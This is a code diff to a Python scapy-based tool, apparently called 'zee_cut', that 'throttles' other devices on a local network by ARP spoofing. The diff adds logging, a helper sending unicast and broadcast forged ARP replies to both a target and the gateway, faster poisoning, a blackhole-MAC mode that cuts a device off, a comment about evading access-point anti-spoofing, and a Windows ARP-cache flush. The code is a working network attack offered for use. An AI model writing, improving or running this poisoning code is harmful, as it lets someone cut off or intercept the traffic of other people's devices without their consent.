@@ -11,13 +11,15 @@ import struct
 import uuid
 import subprocess
 import re
+import logging
+from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
 from dataclasses import dataclass, field
 from typing import Optional, Callable
 
 try:
     from scapy.all import (
-        ARP, Ether, srp, send, sendp, getmacbyip, conf,
+        ARP, Ether, srp, sendp, getmacbyip, conf,
         get_if_list, get_if_addr, get_if_hwaddr, IFACES
     )
     from scapy.arch.windows import get_windows_if_list
@@ -59,6 +61,8 @@ class NetworkEngine:
     """Core engine for network scanning and ARP-based throttling."""
 
     def __init__(self):
+        self.log_file = (Path(__file__).resolve().parent.parent / "logs" / "network_engine.log")
+        self._logger = self._build_logger()
         self.devices: dict[str, NetworkDevice] = {}
         self.interface: Optional[NetworkInterface] = None
         self._throttle_threads: dict[str, threading.Thread] = {}
@@ -71,6 +75,23 @@ class NetworkEngine:
         self._hostname_executor = ThreadPoolExecutor(max_workers=8)
         self.on_devices_updated: Optional[Callable] = None
         self.on_status_changed: Optional[Callable] = None
+        self._logger.info("NetworkEngine initialized")
+
+    def _build_logger(self) -> logging.Logger:
+        """Build file logger for diagnostics."""
+        logger = logging.getLogger("zee_cut.network_engine")
+        logger.setLevel(logging.INFO)
+        logger.propagate = False
+
+        if not logger.handlers:
+            self.log_file.parent.mkdir(parents=True, exist_ok=True)
+            handler = logging.FileHandler(self.log_file, encoding="utf-8")
+            handler.setFormatter(logging.Formatter(
+                "%(asctime)s | %(levelname)s | %(message)s"
+            ))
+            logger.addHandler(handler)
+
+        return logger
 
     def get_interfaces(self) -> list[NetworkInterface]:
         """Get all available network interfaces, matching psutil with scapy."""
@@ -476,6 +497,40 @@ class NetworkEngine:
             last_octet = 0
         return f"02:00:00:00:00:{last_octet:02x}"
 
+    def _send_arp_reply(
+        self,
+        target_ip: str,
+        target_mac: str,
+        claimed_ip: str,
+        claimed_mac: str,
+        count: int = 1
+    ):
+        """Send ARP is-at via L2 with explicit Ethernet destination."""
+        if not self.interface or not target_mac:
+            return
+
+        iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface
+
+        # Keep Ethernet source as NIC MAC (default) to avoid AP anti-spoof side effects.
+        unicast = Ether(dst=target_mac) / ARP(
+            op=2,
+            pdst=target_ip,
+            hwdst=target_mac,
+            psrc=claimed_ip,
+            hwsrc=claimed_mac
+        )
+        sendp(unicast, verbose=False, count=count, iface=iface)
+
+        # Also send broadcast is-at for clients that refresh ARP from broadcasts only.
+        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
+            op=2,
+            pdst=target_ip,
+            hwdst="ff:ff:ff:ff:ff:ff",
+            psrc=claimed_ip,
+            hwsrc=claimed_mac
+        )
+        sendp(broadcast, verbose=False, count=max(1, count // 2), iface=iface)
+
     def throttle_device(self, ip: str, level: int = 0):
         """
         Throttle a device using ARP spoofing.
@@ -511,34 +566,40 @@ class NetworkEngine:
             self._notify_status(f"⚡ Throttling {ip} (level: {100 - level}%)")
             gateway_ip = self.interface.gateway_ip
             target_mac = device.mac
-            iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface
+            self._logger.info(
+                "Throttle start ip=%s level=%s iface_ip=%s gateway_ip=%s target_mac=%s gateway_mac=%s",
+                ip,
+                level,
+                self.interface.ip if self.interface else "",
+                gateway_ip,
+                target_mac,
+                self.interface.gateway_mac if self.interface else ""
+            )
             spoof_hwsrc = self._blackhole_mac(ip) if level == 0 else self.interface.mac
 
             while not stop_event.is_set():
                 try:
-                    # Spoofed ARP: Tell target that gateway is at our MAC
-                    arp_to_target = ARP(
-                        op=2,
-                        pdst=ip,
-                        hwdst=target_mac,
-                        psrc=gateway_ip,
-                        hwsrc=spoof_hwsrc
+                    # Spoofed ARP: tell target that gateway IP is at spoofed MAC
+                    poison_count = 5 if level == 0 else 3
+                    self._send_arp_reply(
+                        target_ip=ip,
+                        target_mac=target_mac,
+                        claimed_ip=gateway_ip,
+                        claimed_mac=spoof_hwsrc,
+                        count=poison_count
                     )
 
-                    # Spoofed ARP: Tell gateway that target is at our MAC
-                    arp_to_gateway = ARP(
-                        op=2,
-                        pdst=gateway_ip,
-                        hwdst=self.interface.gateway_mac,
-                        psrc=ip,
-                        hwsrc=spoof_hwsrc
+                    # Spoofed ARP: tell gateway that target IP is at spoofed MAC
+                    self._send_arp_reply(
+                        target_ip=gateway_ip,
+                        target_mac=self.interface.gateway_mac,
+                        claimed_ip=ip,
+                        claimed_mac=spoof_hwsrc,
+                        count=poison_count
                     )
-
-                    send(arp_to_target, verbose=False, count=3, iface=iface)
-                    send(arp_to_gateway, verbose=False, count=3, iface=iface)
 
                     if level == 0:
-                        stop_event.wait(0.5)
+                        stop_event.wait(0.2)
                     elif level <= 30:
                         stop_event.wait(0.8)
                     elif level <= 60:
@@ -548,14 +609,12 @@ class NetworkEngine:
 
                 except Exception as e:
                     self._notify_status(f"Spoof error for {ip}: {e}")
+                    self._logger.exception("Spoof loop error ip=%s", ip)
                     stop_event.wait(2)
 
         thread = threading.Thread(target=_spoof_loop, daemon=True)
         self._throttle_threads[ip] = thread
         thread.start()
-
-        if self.on_devices_updated:
-            self.on_devices_updated()
 
     def restore_device(self, ip: str):
         """Restore a device to normal network operation."""
@@ -572,38 +631,31 @@ class NetworkEngine:
             device = self.devices[ip]
             if device.is_throttled and self.interface:
                 try:
-                    iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface
-
-                    # Send correct ARP to target
-                    arp_to_target = ARP(
-                        op=2,
-                        pdst=ip,
-                        hwdst=device.mac,
-                        psrc=self.interface.gateway_ip,
-                        hwsrc=self.interface.gateway_mac
+                    # Send correct ARP to target (gateway IP -> gateway MAC)
+                    self._send_arp_reply(
+                        target_ip=ip,
+                        target_mac=device.mac,
+                        claimed_ip=self.interface.gateway_ip,
+                        claimed_mac=self.interface.gateway_mac,
+                        count=5
                     )
 
-                    # Send correct ARP to gateway
-                    arp_to_gateway = ARP(
-                        op=2,
-                        pdst=self.interface.gateway_ip,
-                        hwdst=self.interface.gateway_mac,
-                        psrc=ip,
-                        hwsrc=device.mac
+                    # Send correct ARP to gateway (target IP -> target MAC)
+                    self._send_arp_reply(
+                        target_ip=self.interface.gateway_ip,
+                        target_mac=self.interface.gateway_mac,
+                        claimed_ip=ip,
+                        claimed_mac=device.mac,
+                        count=5
                     )
-
-                    send(arp_to_target, verbose=False, count=5, iface=iface)
-                    send(arp_to_gateway, verbose=False, count=5, iface=iface)
 
                     self._notify_status(f"✅ Restored {ip} to normal")
                 except Exception as e:
                     self._notify_status(f"Restore error for {ip}: {e}")
+                    self._logger.exception("Restore error ip=%s", ip)
 
             device.is_throttled = False
             device.throttle_level = 100
-
-        if self.on_devices_updated:
-            self.on_devices_updated()
 
     def restore_all(self):
         """Restore all throttled devices."""
@@ -623,6 +675,7 @@ class NetworkEngine:
 
     def _notify_status(self, message: str):
         """Send status update."""
+        self._logger.info(message)
         if self.on_status_changed:
             self.on_status_changed(message)
 
@@ -666,3 +719,30 @@ class NetworkEngine:
             )
         except Exception:
             pass
+
+    def flush_arp_cache(self) -> tuple[bool, str]:
+        """Flush Windows ARP cache (requires admin rights)."""
+        commands = [
+            ["cmd", "/c", "arp -d *"],
+            ["netsh", "interface", "ip", "delete", "arpcache"],
+        ]
+
+        for cmd in commands:
+            try:
+                result = subprocess.run(
+                    cmd,
+                    capture_output=True,
+                    text=True,
+                    timeout=10,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+                if result.returncode == 0:
+                    message = "ARP cache flushed."
+                    self._notify_status(message)
+                    return True, message
+            except Exception:
+                continue
+
+        message = "Failed to flush ARP cache. Run app as Administrator."
+        self._notify_status(message)
+        return False, message
